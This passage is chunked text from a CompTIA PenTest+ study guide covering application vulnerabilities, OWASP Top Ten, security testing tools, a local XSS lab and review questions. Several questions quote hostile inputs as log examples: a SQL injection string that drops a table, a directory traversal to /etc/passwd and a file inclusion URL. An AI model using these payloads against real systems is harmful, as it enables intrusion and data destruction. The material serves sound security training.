input validation, remember that cybersecurity professionals embrace a defense‐in‐depth approach to security. For example, your input validation routine might itself contain a flaw that allows potentially malicious input to pass through to the application. Error handling serves as a secondary control in that case, preventing the malicious input from triggering a dangerous error condition. On the flip side of the error handling coin, overly verbose error handling routines may also present risk. If error handling routines explain too much about the inner workings of code, they may allow an attacker to find a way to exploit the code. For example, Figure 9.15 shows an error message appearing on a website that contains details of the SQL query used to create the web page. This could allow an attacker to determine the table structure and attempt a SQL injection attack. Hard‐Coded Credentials In some cases, developers may include usernames and passwords in source code. There are two variations on this error. First, the developer may
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	verbose error handling routines may also present risk. If error handling routines explain too much about the inner workings of code, they may allow an attacker to find a way to exploit the code. For example, Figure 9.15 shows an error message appearing on a website that contains details of the SQL query used to create the web page. This could allow an attacker to determine the table structure and attempt a SQL injection attack. Hard‐Coded Credentials In some cases, developers may include usernames and passwords in source code. There are two variations on this error. First, the developer may create a hard‐coded maintenance account for the application that allows the developer to regain access even if the authentication system fails. This is known as a backdoor vulnerability and is problematic because it allows anyone who knows the backdoor password to bypass normal authentication and gain access to the system. If the backdoor becomes publicly (or privately!) known, all copies of the code in production are compromised. The second variation of hard‐coding credentials occurs when developers include access credentials for other services within their source code. If that code is intentionally or accidentally disclosed, those credentials then become known to outsiders. This occurs quite often when developers accidentally publish code into a public code repository, such as GitHub, that contains API keys or other hard‐coded credentials. FIGURE 9.15 SQL error disclosure Race Conditions Race conditions occur when the security of a code segment depends on the sequence of events occurring within the system. The time‐of‐check‐to‐time‐ of‐use (TOCTTOU or TOC/TOU) issue is a race condition that occurs when a program checks access permissions too far in advance of a resource request. For example, if an operating system builds a comprehensive list of access permissions for a user upon logon and then consults that list throughout the logon session, a TOCTTOU vulnerability exists. If the system administrator revokes a particular permission, that restriction would not be applied to the user until the next time they log on. If the user is logged on when the access revocation takes place, they will have access to the resource indefinitely. The user simply needs to leave the session open for days, and the new restrictions will never be applied. To prevent this race condition, the developer should evaluate access permissions at the time of each request rather than caching a listing of permissions. API Abuse Organizations often want other developers to build on the platforms that they have created. For example, X and Facebook might want to allow third‐ party application developers to create apps that post content to the user's social media feeds. To enable this type of innovation, services often create application programming interfaces (APIs) that enable automated access. If not properly secured, unprotected APIs may lead to the unauthorized use of functions. For example, an API that does not use appropriate authentication may allow anyone with knowledge of the API URLs to modify a service. APIs that are not intended for public
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Organizations often want other developers to build on the platforms that they have created. For example, X and Facebook might want to allow third‐ party application developers to create apps that post content to the user's social media feeds. To enable this type of innovation, services often create application programming interfaces (APIs) that enable automated access. If not properly secured, unprotected APIs may lead to the unauthorized use of functions. For example, an API that does not use appropriate authentication may allow anyone with knowledge of the API URLs to modify a service. APIs that are not intended for public use should always be secured with an authentication mechanism, such as an API key, and accessed only over encrypted channels that protect those credentials from eavesdropping attacks. The earliest APIs made use of a standard called the Simple Object Access Protocol (SOAP). SOAP allows the exchange of service information using XML format. The SOAP protocol grew out of an earlier approach known as the XML Remote Procedure Call (XML‐RPC) protocol. SOAP was the common standard for many years, but it has since been surpassed in popularity. Modern APIs mostly use a standard called Representational State Transfer (REST). REST uses the same HTTPS protocol used for web communications. This allows it to provide secure API endpoints that offer encrypted connections to their clients. These features make RESTful APIs quite accessible and have resulted in their overwhelming popularity. As a security professional, you should be familiar with the API technology used in your organization, both by developers publishing services and users consuming them. There are two primary considerations when looking at API security: Ensure that all communications between clients and servers are encrypted. When APIs are run over web services, this is as simple as enforcing the use of the encrypted HTTPS protocol instead of the unencrypted and insecure HTTP protocol. For non‐public APIs, verify that API keys are being used to limit this access and that the storage, distribution, and transmission of those keys is done in a secure fashion. Anyone who gains access to another user's API key can essentially become that user as far as the remote service is concerned. Unsigned Code Code signing provides developers with a way to confirm the authenticity of their code to end users. Developers use a cryptographic function to digitally sign their code with their own private key, and then browsers can use the developer's public key to verify that signature and ensure that the code is legitimate and was not modified by unauthorized individuals. In cases where there is a lack of code signing, users may inadvertently run inauthentic code. OWASP Top Ten Web Application Security Risks The Open Worldwide Application Security Project (OWASP) maintains a list of the top 10 web security vulnerabilities that cybersecurity experts should understand and defend against to maintain secure web services. It's available at https://owasp.org/www-project-top-ten. The current version, released in 2021, includes the following issues: Broken access control occurs when developers fail to check on the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the developer's public key to verify that signature and ensure that the code is legitimate and was not modified by unauthorized individuals. In cases where there is a lack of code signing, users may inadvertently run inauthentic code. OWASP Top Ten Web Application Security Risks The Open Worldwide Application Security Project (OWASP) maintains a list of the top 10 web security vulnerabilities that cybersecurity experts should understand and defend against to maintain secure web services. It's available at https://owasp.org/www-project-top-ten. The current version, released in 2021, includes the following issues: Broken access control occurs when developers fail to check on the backend whether a user is authorized to access a particular function of an application. Users with knowledge of the application may send requests directly to the server, bypassing the security controls built into the user interface. Cryptographic failures occur when insecure web applications accidentally expose sensitive information to eavesdroppers. This may be as simple as accidentally placing a customer file on a publicly accessible portion of a website, or it may occur when web server administrators fail to implement the HTTPS protocol to encrypt information sent over the Internet. Injection occurs when an attacker is able to insert code into a request sent to a website and then trick that website into passing the code along to a backend server where it is executed. Insecure design flaws exist when the fundamental design of a system has security issues. Remedying these issues requires incorporating security early in system design efforts. Security misconfigurations occur because web applications depend on a large number of complex systems, including web servers, application servers, database servers, firewalls, routers, and other components. Each of these has its own security settings and an error anywhere in those settings could jeopardize the security of the entire system. Vulnerable and outdated components occur when web developers aren't cautious about the components they use to build their applications. If a web application is built using a vulnerable component, attackers may exploit that component to attack the application itself. Administrators must be sure to monitor their environment regularly and apply security patches to components as soon as they are available. Identification and authentication failures occur when websites require that users authenticate but then have flaws in the mechanisms that provide that authentication. Software and data integrity failures occur when software updates, critical data, or CI/CD pipelines are not properly protected against integrity violations. For example, an attacker might inject malicious code into a software update or alter sensitive data, leading to unauthorized actions when the compromised software or data is used. Security logging and monitoring failures occur when applications don't create detailed log records that contain information crucial to security investigations and troubleshooting efforts. Server‐side request forgery (SSRF) occurs when a web application allows an attacker to make requests to unintended locations, such as internal systems, through the application's server. SSRF can enable attackers to access internal services, retrieve sensitive data, or exploit further vulnerabilities within the network that would otherwise be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	violations. For example, an attacker might inject malicious code into a software update or alter sensitive data, leading to unauthorized actions when the compromised software or data is used. Security logging and monitoring failures occur when applications don't create detailed log records that contain information crucial to security investigations and troubleshooting efforts. Server‐side request forgery (SSRF) occurs when a web application allows an attacker to make requests to unintended locations, such as internal systems, through the application's server. SSRF can enable attackers to access internal services, retrieve sensitive data, or exploit further vulnerabilities within the network that would otherwise be inaccessible from the outside. Application Testing Tools No matter how talented the development team for an application is, there will be some form of flaws in the code. In their annual survey of application security issues, Veracode consistently finds that hundreds of thousands of applications contain significant security vulnerabilities. That points to a massive need for software security testing to continue to be better integrated into the software development life cycle. Veracode provides a useful yearly review of the state of software security. You can read more of the 2024 report at https://www.veracode.com/state-software-security-2024-report. This sorry state of software security provides an opening for attackers and penetration testers to defeat security controls. The automated tools available to developers may also be used to gain valuable information during a penetration test. The source code that is the basis of every application and program can contain a variety of bugs and flaws, from programming and syntax errors to problems with business logic, error handling, and integration with other services and systems. It is important to be able to analyze the code to understand what the code does, how it performs that task, and where flaws may occur in the program itself. This is often done via static or dynamic code analysis along with testing methods like fuzzing, fault injection, mutation testing, and stress testing. Once changes are made to code and it is deployed, it must be regression‐tested to ensure that the fixes put in place didn't create new security issues! Static Application Security Testing (SAST) Static application security testing (SAST), or source code analysis, is conducted by reviewing the code for an application. Since static analysis uses the source code for an application, it can be seen as a type of white‐ box testing with full visibility to the testers. This can allow testers to find problems that other tests might miss, either because the logic is not exposed to other testing methods or because of internal business logic problems. Unlike many other methods, static analysis does not run the program; instead, it focuses on understanding how the program is written and what the code is intended to do. Static code analysis can be conducted using automated tools or manually by reviewing the code—a process sometimes called “code understanding.” Automated static code analysis can be very effective at finding known issues, and manual static code analysis helps identify programmer‐induced errors. The Open
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	allow testers to find problems that other tests might miss, either because the logic is not exposed to other testing methods or because of internal business logic problems. Unlike many other methods, static analysis does not run the program; instead, it focuses on understanding how the program is written and what the code is intended to do. Static code analysis can be conducted using automated tools or manually by reviewing the code—a process sometimes called “code understanding.” Automated static code analysis can be very effective at finding known issues, and manual static code analysis helps identify programmer‐induced errors. The Open Worldwide Application Security Project (OWASP) provides static code analysis tools for .NET, Java, PHP, C, and JSP, as well as a list of other static code analysis tools, at https://owasp.org/wwwcommunity/controls/Static_Code_Analysis. This type of testing is extremely important in infrastructure as code (IaC) environments, where the technology infrastructure is automatically deployed by code. In IaC scenarios, configuration files and scripts define how infrastructure components should be provisioned and managed. Any security flaws in these scripts could lead to vulnerable infrastructure being deployed across the environment. Therefore, applying SAST to IaC scripts helps ensure that infrastructure is secure by design, preventing potential vulnerabilities before they can be introduced into the production environment. Software Composition Analysis As software development increasingly relies on open source libraries and third‐party components, it becomes critical to understand and manage the risks associated with these dependencies. Software composition analysis (SCA) tools are designed to help developers and security professionals identify and address vulnerabilities in the third‐party libraries and components that are used within their applications. SCA tools work by scanning the codebase to identify all third‐party components used within the application. These tools compare the identified components against a database of known vulnerabilities (such as the National Vulnerability Database) and report any security issues, outdated versions, or licensing concerns. The key capabilities of SCA tools include: Dependency Mapping: SCA tools create a comprehensive inventory of all third‐party components and their dependencies within the application. This map helps developers understand the full scope of external code integrated into their software. Vulnerability Detection: By cross‐referencing the components with databases of known vulnerabilities, SCA tools can alert developers to security risks that need to be addressed. This includes both direct dependencies and transitive dependencies (libraries that are indirectly included through other libraries). License Compliance: Many open source components are subject to specific licensing terms. SCA tools help ensure that all components comply with the organization's licensing policies, avoiding potential legal issues. Remediation Guidance: SCA tools often provide recommendations for resolving identified issues, such as upgrading to a secure version of a component or replacing a vulnerable library with a safer alternative. Dynamic Application Security Testing (DAST) Dynamic application security testing (DAST) relies on execution of the code while providing it with input to test the software. Much like static code analysis, dynamic code analysis may be done via automated tools or manually, but there is a strong preference for automated testing
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	specific licensing terms. SCA tools help ensure that all components comply with the organization's licensing policies, avoiding potential legal issues. Remediation Guidance: SCA tools often provide recommendations for resolving identified issues, such as upgrading to a secure version of a component or replacing a vulnerable library with a safer alternative. Dynamic Application Security Testing (DAST) Dynamic application security testing (DAST) relies on execution of the code while providing it with input to test the software. Much like static code analysis, dynamic code analysis may be done via automated tools or manually, but there is a strong preference for automated testing due to the volume of tests that need to be conducted in most dynamic code testing processes. Interception Proxies Interception proxies are valuable tools for penetration testers and others seeking to evaluate the security of web applications. As such, these web proxies can be classified as exploit tools. They run on the tester's system and intercept requests being sent from the web browser to the web server before they are released onto the network. This allows the tester to manually manipulate the request to attempt the injection of an attack. They also allow penetration testers to defeat browser‐based input validation techniques. Some of these tools are browser plug‐ins that function as application proxies. There are other tools that fulfill this same purpose and are browser‐ independent. For example, Figure 9.16 shows the popular open source Zed Attack Proxy (ZAP). ZAP is a community development project. Users of ZAP can intercept requests sent from any web browser and alter them before passing them to the web server. FIGURE 9.16 Zed Attack Proxy (ZAP) The Burp Proxy, shown in Figure 9.17, is another option available to cybersecurity analysts seeking an interception proxy. It is part of a commercial web application security toolkit called the Burp Suite from PortSwigger. Although the full Burp Suite requires a paid license, Burp Proxy is currently available as part of a free edition of the product called the Burp Suite community edition. FIGURE 9.17 Burp Proxy Postman is a tool primarily used for developing, testing, and documenting APIs (application programming interfaces). Unlike traditional interception proxies such as ZAP and Burp Suite, which focus on intercepting and manipulating web traffic, Postman is designed to facilitate API testing by allowing users to send HTTP requests directly to an API endpoint and analyze the responses. Postman provides a user‐friendly interface, shown in Figure 9.18. Testers can manually create HTTP requests, specify headers, choose the HTTP method (GET, POST, PUT, DELETE, etc.), and input request parameters or body content. Once a request is crafted, Postman sends it to the API, and the response is displayed within the tool, including status codes, headers, and body content. This capability makes Postman an essential tool for testing the functionality, performance, and security of APIs. Fuzzing Interception proxies allow web application testers to manually alter the input sent to a web application in an attempt to exploit security vulnerabilities. Fuzzers are automated testing tools that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	shown in Figure 9.18. Testers can manually create HTTP requests, specify headers, choose the HTTP method (GET, POST, PUT, DELETE, etc.), and input request parameters or body content. Once a request is crafted, Postman sends it to the API, and the response is displayed within the tool, including status codes, headers, and body content. This capability makes Postman an essential tool for testing the functionality, performance, and security of APIs. Fuzzing Interception proxies allow web application testers to manually alter the input sent to a web application in an attempt to exploit security vulnerabilities. Fuzzers are automated testing tools that rapidly create thousands of variants on input in an effort to test many more input combinations than would be possible with manual techniques. Their primary use is as a preventive tool to ensure that software flaws are identified and fixed. FIGURE 9.18 Postman PenTest+ candidates should be familiar with the wfuzz tool. Wfuzz is a command‐line tool that performs fuzz testing against web applications. An example of wfuzz in action is shown in Figure 9.19. FIGURE 9.19 Wfuzz performing fuzz testing Scanners Scanners also play an important role in application and server testing. In Chapter 4, “Vulnerability Scanning,” you learned about the role that vulnerability scanners play in an enterprise cybersecurity program and how they may be adapted for use in penetration testing. Gobuster Gobuster is a scanning tool that probes deployed applications and servers for specific vulnerabilities. Gobuster derives its name from the fact that it is written in the Go programming language and that it is a file, directory, and domain name busting tool. Busting is the process of identifying unadvertised files and directories on a server as well as enumerating the subdomains valid for a domain. Penetration testers use these tools in an effort to discover hidden administrative interfaces, testing pages, documentation, and other resources that may be useful in their work. Figure 9.20 shows the partial results of Gobuster being used in DNS enumeration mode against the wiley.com domain. FIGURE 9.20 Gobuster DNS enumeration DirBuster DirBuster is another powerful tool used by penetration testers to uncover hidden files and directories on a web server. Developed as an open source project by OWASP, DirBuster performs brute‐force attacks using a wordlist to locate files and directories that are not directly linked on the website but that may be accessible to an attacker. This tool can be particularly effective in finding sensitive files, configuration backups, or undocumented admin pages that are inadvertently exposed. DirBuster works by systematically sending requests to the server for each possible filename or directory listed in the wordlist. If the server responds positively, the tool logs the discovered resource, which the penetration tester can then further investigate. DirBuster's ability to perform recursive searches also allows it to explore discovered directories for additional hidden resources. WPScan You also may find it helpful to use tools specifically designed to work with the web applications in your environment. For example, many organizations use the popular WordPress content management
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in finding sensitive files, configuration backups, or undocumented admin pages that are inadvertently exposed. DirBuster works by systematically sending requests to the server for each possible filename or directory listed in the wordlist. If the server responds positively, the tool logs the discovered resource, which the penetration tester can then further investigate. DirBuster's ability to perform recursive searches also allows it to explore discovered directories for additional hidden resources. WPScan You also may find it helpful to use tools specifically designed to work with the web applications in your environment. For example, many organizations use the popular WordPress content management system. Figure 9.21 shows a screenshot of WPScan, a vulnerability scanner designed specifically for use against WordPress installations. FIGURE 9.21 WPScan WordPress vulnerability scanner Interactive Application Security Testing (IAST) Interactive Application Security Testing (IAST) combines elements of both static and dynamic testing to provide a comprehensive approach to identifying security vulnerabilities in applications. IAST operates by instrumenting the application code while it is running, allowing it to monitor and analyze both the internal workings of the code (like SAST) and the application's behavior during execution (like DAST). This dual approach allows IAST to detect vulnerabilities with greater accuracy, as it can consider the actual execution flow, data inputs, and system interactions in real time. As a result, IAST can identify complex issues such as runtime vulnerabilities, insecure configurations, and logical flaws that might be missed by SAST or DAST alone. IAST tools are typically integrated into the development environment, providing real‐time feedback to developers as they write and test their code. This integration supports a DevSecOps approach, where security is embedded into the continuous integration and continuous delivery (CI/CD) pipeline, allowing for the early detection and remediation of vulnerabilities. Additionally, because IAST works within the running application, it minimizes the number of false positives often associated with SAST and DAST, giving developers more reliable and actionable insights. By leveraging IAST, organizations can significantly improve their application security posture, ensuring that vulnerabilities are identified and addressed throughout the development life cycle, rather than after the application has been deployed. Database Scanning Databases contain some of an organization's most sensitive information and are lucrative targets for attackers. Although most databases are protected from direct external access by firewalls, web applications offer a portal into those databases, and attackers may leverage database‐backed web applications to direct attacks against databases, including SQL injection attacks. Database vulnerability scanners are tools that allow penetration testers, other security professionals, and attackers to scan both databases and web applications for vulnerabilities that may affect database security. sqlmap is a commonly used open source database vulnerability scanner that allows security administrators to probe web applications for database vulnerabilities. Figure 9.22 shows an example of sqlmap scanning a web application. FIGURE 9.22 Scanning a database‐backed application with sqlmap Secrets Scanning Secrets scanning is an important security practice that helps identify and protect sensitive information, such as API keys, passwords, and tokens, that may accidentally be included in source code or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Database vulnerability scanners are tools that allow penetration testers, other security professionals, and attackers to scan both databases and web applications for vulnerabilities that may affect database security. sqlmap is a commonly used open source database vulnerability scanner that allows security administrators to probe web applications for database vulnerabilities. Figure 9.22 shows an example of sqlmap scanning a web application. FIGURE 9.22 Scanning a database‐backed application with sqlmap Secrets Scanning Secrets scanning is an important security practice that helps identify and protect sensitive information, such as API keys, passwords, and tokens, that may accidentally be included in source code or configuration files. If these secrets are exposed, they can be exploited by attackers to gain unauthorized access to systems and data, leading to serious security breaches. Secrets scanning tools automatically search through codebases and other files to detect this sensitive information before it reaches production environments. TruffleHog is a widely used tool for secrets scanning, designed to help developers and security teams find secrets that may have been accidentally committed to version control systems like Git. TruffleHog scans the entire history of a repository, looking for strings and patterns that resemble common credentials or secrets. It can also search for specific keywords or use regular expressions to detect different types of sensitive data. By using TruffleHog in the development process, organizations can identify and fix exposed secrets early, reducing the risk of security incidents and ensuring that sensitive information stays secure. Summary Application vulnerabilities provide fertile ground for penetration testers seeking to gain a foothold in an organization or to exploit and pivot their initial access. Applications may suffer from a wide range of issues that allow testers to steal data, execute arbitrary code, and gain full control of systems and entire networks. The tools used by software developers and security professionals to test code also serve as wonderful reconnaissance tools for hackers and penetration testers. Static analysis tools perform analysis of source code, whereas dynamic security assessment tools run code through rigorous testing to evaluate the outputs obtained from various scenarios. Together, these two techniques provide penetration testers with detailed information on the state of application security in an organization. Exam Essentials Know the different types of application scans. Static application security testing (SAST) tools perform analysis of an application's source code to identify security vulnerabilities without actually executing the code. Dynamic application security testing (DAST) tools execute the code and run it through many different input scenarios in an attempt to find vulnerabilities. Interactive application security testing (IAST) combines elements of both SAST and DAST by instrumenting the application while it runs. Software composition analysis (SCA) focuses on identifying security vulnerabilities within third‐party libraries and open source components. Secrets scanning tools automatically search through codebases and configuration files to detect sensitive information, like API keys and passwords, that may have been inadvertently exposed. Understand how injection vulnerabilities allow attackers to interact with backend systems. SQL injection vulnerabilities are the most common example, allowing an attacker to exploit a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	code and run it through many different input scenarios in an attempt to find vulnerabilities. Interactive application security testing (IAST) combines elements of both SAST and DAST by instrumenting the application while it runs. Software composition analysis (SCA) focuses on identifying security vulnerabilities within third‐party libraries and open source components. Secrets scanning tools automatically search through codebases and configuration files to detect sensitive information, like API keys and passwords, that may have been inadvertently exposed. Understand how injection vulnerabilities allow attackers to interact with backend systems. SQL injection vulnerabilities are the most common example, allowing an attacker to exploit a dynamic web application to gain access to the underlying database. The best defense against injection vulnerabilities is to perform rigorous input validation on any user‐supplied input. Know that password authentication techniques contain many insecurities. Passwords use a weak, knowledge‐based approach to authentication and are vulnerable to eavesdropping, phishing, and other means of theft. Multifactor techniques strengthen authentication systems by supplementing password security with either biometric or token‐based controls. Explain how session hijacking attacks exploit vulnerable cookies. Attackers who are able to obtain the session cookie used to authenticate a user's web session may hijack that session and take control of the user's account. Cookies used for authentication should always be securely generated and transmitted only over secure, encrypted communications channels, such as TLS‐protected HTTPS sessions. Know that web application vulnerabilities are diverse and complex. Insecure direct object references may allow attackers to bypass authorization schemes and gain access to confidential information by incrementing an object counter or performing similar URL manipulation. Directory traversal attacks allow an attacker to navigate through a web server's filesystem. Explain how cross‐site scripting and cross‐site request forgery exploits allow attackers to hijack legitimate sites. Cross‐site scripting (XSS) attacks inject malicious scripting code in an otherwise legitimate website through the use of persistent/stored content or reflected input. Cross‐site request forgery (CSRF) attacks exploit the likelihood that users are simultaneously logged into multiple websites and use a malicious site to send commands to a legitimate site. Understand the role of interception proxies in web application testing. Interception proxies intercept and manipulate traffic between the client and server, allowing penetration testers to explore vulnerabilities like injection flaws, authentication issues, and insecure configurations. Burp Suite offers a comprehensive suite of tools, including a scanner, intruder, and repeater, making it a versatile choice for security testing. ZAP, an open source alternative, provides similar capabilities and is particularly popular in the security community for its flexibility and ease of use. Leverage scanning tools to identify web application vulnerabilities. Gobuster and DirBuster are directory and file busting tools used to find unadvertised files, directories, and subdomains that could expose sensitive information. WPScan specializes in identifying vulnerabilities in WordPress installations, including outdated plugins and themes. Wfuzz is a versatile fuzzer used for brute‐forcing web application parameters, making it a powerful tool for finding hidden content and security weaknesses. Understand the importance of specialized tools for API and secrets security. Postman is primarily used
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	alternative, provides similar capabilities and is particularly popular in the security community for its flexibility and ease of use. Leverage scanning tools to identify web application vulnerabilities. Gobuster and DirBuster are directory and file busting tools used to find unadvertised files, directories, and subdomains that could expose sensitive information. WPScan specializes in identifying vulnerabilities in WordPress installations, including outdated plugins and themes. Wfuzz is a versatile fuzzer used for brute‐forcing web application parameters, making it a powerful tool for finding hidden content and security weaknesses. Understand the importance of specialized tools for API and secrets security. Postman is primarily used for testing and interacting with APIs, making it easier to identify security issues in API endpoints. sqlmap automates the process of detecting and exploiting SQL injection vulnerabilities in web applications, providing a powerful means of testing database security. TruffleHog is a secrets scanning tool that searches for sensitive information, such as API keys and credentials, in code repositories, helping to prevent accidental exposure of critical data. Lab Exercises Activity 9.1: Application Security Testing Techniques Refer back to the MCDS, LLC, scenario introduced at the beginning of this chapter. As a security consultant to MCDS, you are responsible for preparing a penetration testing plan for the applications used by MCDS. After interviewing the MCDS team, you learn that the organization develops a wide variety of custom applications. These include a web‐based customer portal, a mobile application used by customers and salespeople to track orders, and some desktop applications that support the organization's manufacturing process. Develop a plan for conducting this penetration test. Be sure to describe the specific tools that you will use to test each type of application and the types of vulnerabilities that you will search for in each environment. Activity 9.2: Using the ZAP Proxy In this exercise, you will install the ZAP interception proxy on your system and use it to intercept and modify a request before it is sent to a website. 1. Visit the ZAP homepage at www.zaproxy.org. 2. Download and install the version of ZAP appropriate for your operating system. 3. Review the ZAP in Ten videos at https://www.zaproxy.org/zap-in-ten. 4. Use ZAP to intercept a request sent from your browser to a search engine. Using ZAP, modify the request to change the search term sent to the remote site. 5. View the results. Did your browser display the results for the term that you typed into the browser, or did it display the results for the search term that you changed using ZAP? Activity 9.3: Creating a Cross‐Site Scripting Vulnerability In this activity, you will create a cross‐site scripting vulnerability using an HTML page saved on your local computer. 1. Using a text editor of your choice, create an HTML file containing some simple content of your choice. For example, you might want to model your code after the sample page used earlier in this chapter: <p>Hello everyone,</p> <p>I am planning an upcoming trip to <A HREF= 'https://www.mlb.com/mets/ballpark'>Citi Field</A> to see the Mets take
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	typed into the browser, or did it display the results for the search term that you changed using ZAP? Activity 9.3: Creating a Cross‐Site Scripting Vulnerability In this activity, you will create a cross‐site scripting vulnerability using an HTML page saved on your local computer. 1. Using a text editor of your choice, create an HTML file containing some simple content of your choice. For example, you might want to model your code after the sample page used earlier in this chapter: <p>Hello everyone,</p> <p>I am planning an upcoming trip to <A HREF= 'https://www.mlb.com/mets/ballpark'>Citi Field</A> to see the Mets take on the Yankees in the Subway Series.</p> <p>Does anyone have suggestions for transportation? I am staying in Manhattan and am only interested in <B>public transportation</B> options.</p> <p>Thanks!</p> <p>Mike<p/> 2. Open the file stored on your local computer and view it using your favorite browser. 3. In your text editor, modify the file that you created in step 1 to include a cross‐site scripting attack. You may wish to refer to the example in the section “Cross‐Site Scripting (XSS)” earlier in this chapter if you need assistance. 4. After saving the modified file, refresh the page in your browser. Did you see the impact of your cross‐site scripting attack? Review Questions You can find the answers in the Appendix A. 1. Which one of the following approaches, when feasible, is the most effective way to defeat injection attacks? A. Browser‐based input validation B. Input allowlisting C. Input blocklisting D. Signature detection 2. Examine the following network diagram. What is the most appropriate location for a web application firewall (WAF) on this network? A. Location A B. Location B C. Location C D. Location D 3. Joe is examining the logs for his web server and discovers that a user sent input to a web application that contained the string WAITFOR. What type of attack was the user likely attempting? A. Timing‐based SQL injection B. HTML injection C. Cross‐site scripting D. Content‐based SQL injection 4. Which one of the following function calls is closely associated with Linux command injection attacks? A. system() B. sudo() C. mkdir() D. root() 5. Tina is conducting a penetration test and is trying to gain access to a user account. Which of the following is a good source for obtaining user account credentials? A. Social engineering B. Default account lists C. Password dumps from compromised sites D. All of the above 6. What type of credential used in Kerberos is often referred to as the “golden ticket” because of its potential for widespread reuse? A. Session ticket B. Ticket granting ticket (TGT) C. Service ticket D. User ticket 7. Wendy is a penetration tester who wishes to engage in a session hijacking attack. What information is crucial for Wendy to obtain to ensure that her attack will be successful? A. Session ticket B. Session cookie C. Username D. User password 8. Sherry is concerned that a web application in her organization supports unvalidated redirects. Which one of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	All of the above 6. What type of credential used in Kerberos is often referred to as the “golden ticket” because of its potential for widespread reuse? A. Session ticket B. Ticket granting ticket (TGT) C. Service ticket D. User ticket 7. Wendy is a penetration tester who wishes to engage in a session hijacking attack. What information is crucial for Wendy to obtain to ensure that her attack will be successful? A. Session ticket B. Session cookie C. Username D. User password 8. Sherry is concerned that a web application in her organization supports unvalidated redirects. Which one of the following approaches would minimize the risk of this attack? A. Requiring HTTPS B. Encrypting session cookies C. Implementing multifactor authentication D. Restricting redirects to her domain 9. Joe checks his web server logs and sees that someone sent the following query string to an application running on the server: http://www.mycompany.com/servicestatus.php? serviceID=892&serviceID=892' ; DROP TABLE Services;-- What type of attack was most likely attempted? A. Cross‐site scripting B. Session hijacking C. Parameter pollution D. On‐path 10. Upon further inspection, Joe finds a series of thousands of requests to the same URL coming from a single IP address. Here are a few examples: http://www.mycompany.com/servicestatus.php?serviceID=1 http://www.mycompany.com/servicestatus.php?serviceID=2 http://www.mycompany.com/servicestatus.php?serviceID=3 http://www.mycompany.com/servicestatus.php?serviceID=4 http://www.mycompany.com/servicestatus.php?serviceID=5 http://www.mycompany.com/servicestatus.php?serviceID=6 What type of vulnerability was the attacker likely trying to exploit? A. Insecure direct object reference B. File upload C. Unvalidated redirect D. Session hijacking 11. Joe's adventures in web server log analysis are not yet complete. As he continues to review the logs, he finds the request: http://www.mycompany.com/../../../etc/passwd What type of attack was most likely attempted? A. SQL injection B. Session hijacking C. Directory traversal D. File upload 12. What type of attack depends on the fact that users are often logged into many websites simultaneously in the same browser? A. SQL injection B. Cross‐site scripting C. Cross‐site request forgery (XSRF) D. File inclusion 13. What type of cross‐site scripting attack would not be visible to a security professional inspecting the HTML source code in a browser? A. Reflected XSS B. Stored XSS C. Persistent XSS D. DOM‐based XSS 14. Which one of the following attacks is an example of a race condition exploitation? A. XSRF B. XSS C. TOCTTOU D. SQLi 15. Tom is a software developer who creates code for sale to the public. He would like to assure his users that the code they receive actually came from him. What technique can he use to best provide this assurance? A. Code signing B. Code endorsement C. Code encryption D. Code obfuscation 16. Shahla would like to perform testing of an API and is looking for a tool that makes it easy to send and manipulate API requests. What tool would best meet her needs? A. Postman B. DirBuster C. Gobuster D. Wfuzz 17. Norm is performing a penetration test of a web application and would like to manipulate the input sent to the application before it leaves his browser. Which one of the following tools would assist him
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	him. What technique can he use to best provide this assurance? A. Code signing B. Code endorsement C. Code encryption D. Code obfuscation 16. Shahla would like to perform testing of an API and is looking for a tool that makes it easy to send and manipulate API requests. What tool would best meet her needs? A. Postman B. DirBuster C. Gobuster D. Wfuzz 17. Norm is performing a penetration test of a web application and would like to manipulate the input sent to the application before it leaves his browser. Which one of the following tools would assist him with this task? A. Wfuzz B. ZAP C. Gobuster D. WPScan 18. What control is most commonly used to secure access to API interfaces? A. API keys B. Passwords C. Challenge‐response D. Biometric authentication 19. Renee recently discovered that some of her organization's API keys were inadvertently posted in a GitHub repository. What tool can best help her identify any other similar disclosures? A. ZAP B. TruffleHog C. Gobuster D. Sqlmap 20. During a penetration test, Bonnie discovers in a web server log that the testers attempted to access the following URL: http://www.mycompany.com/sortusers.php? file=C:\\uploads\\attack.exe What type of attack did they most likely attempt? A. Reflected XSS B. Persistent XSS C. Local file inclusion D. Remote file inclusion Chapter 10 Exploiting Host Vulnerabilities THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.1 Given a scenario, conduct vulnerability discovery using various techniques. Types of scans Container scans Sidecar scans Industrial control systems (ICS) vulnerability assessment Manual assessment Port mirroring Tools PowerSploit Trivy Domain 4: Attacks and Exploits 4.3 Given a scenario, perform authentication attacks using the appropriate tools. Attack Types Multifactor authentication (MFA) fatigue Pass‐the‐hash attacks Pass‐the‐ticket attacks Pass‐the‐token attacks Kerberos attacks Lightweight Directory Access Protocol (LDAP) injection Dictionary attacks Brute‐force attacks Mask attacks Password spraying Credential stuffing OpenID Connect (OIDC) attacks Security Assertion Markup Language (SAML) attacks Tools CME Responder hashcat John the Ripper Hydra BloodHound Medusa Burp Suite 4.4 Given a scenario, perform host‐based attacks using the appropriate tools. Attack Types Privilege escalation Credential dumping Circumventing security tools Misconfigured endpoints Payload obfuscation User‐controlled access bypass Shell escape Kiosk escape Library injection Process hollowing and injection Log tampering Unquoted service path injection Tools Mimikatz Rubeus Certify Seatbelt PowerShell/PowerShell 